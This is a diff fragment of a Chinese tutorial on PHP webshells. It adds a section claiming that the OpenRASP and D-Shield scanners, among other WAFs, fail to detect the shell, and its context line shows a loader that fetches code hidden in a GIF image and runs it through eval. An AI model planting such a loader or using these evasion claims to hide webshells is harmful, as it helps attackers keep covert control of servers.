@@ -302,6 +302,17 @@ eval(trim(substr(file_get_contents("http://localhost/test/k.gif"),293930)));
 效果:
 ![27](https://ws1.sinaimg.cn/large/006VEsyOgy1g0s7jynbf6g30q20istsz.gif)
 
- 
+### WAF
+OpenRASP WEBDIR+检测引擎:  
+![28](https://ws1.sinaimg.cn/large/006VEsyOgy1g0s7nh7iqxj30xq0d13yu.jpg)
+
+D盾_Web查杀   
+![29](https://ws1.sinaimg.cn/large/006VEsyOgy1g0s7pq3bs6j30n306pdgy.jpg)  
+
+其他几个Waf也是查杀不出的，篇幅有限，就不演示了。
+
+
+
+
 
 
